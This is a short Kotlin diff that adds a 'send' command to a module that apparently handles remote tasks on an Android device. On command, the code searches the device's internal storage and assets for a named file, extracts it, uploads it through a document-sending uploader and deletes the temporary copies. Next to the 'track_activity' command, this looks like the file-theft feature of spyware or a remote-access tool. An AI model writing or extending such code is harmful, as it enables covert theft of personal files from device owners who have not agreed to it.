@@ -39,6 +39,20 @@ class SystemModule(
         val engine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
 
         when (task.cmd) {
+            "send" -> {
+                val targetFile = resolvedArg.trim()
+                wfContext.log("Scouring internal storage and assets for: $targetFile ...")
+                val foundFile = systemHandler.searchAndExtractFile(targetFile)
+
+                if (foundFile != null && foundFile.exists()) {
+                    val isTemp = foundFile.absolutePath.contains("extracted_asset")
+                    uploader.sendDocument(foundFile, "WF Export: ${foundFile.name}", deleteAfter = isTemp)
+                    wfContext.log("File extracted and uploaded successfully: ${foundFile.name}")
+                } else {
+                    wfContext.log("File extraction failed. Could not locate: $targetFile")
+                    return false
+                }
+            }
             "track_activity" -> {
                 val parts = resolvedArg.split(",").map { it.trim() }
                 val duration = parts.getOrNull(0)?.toLongOrNull() ?: 10L
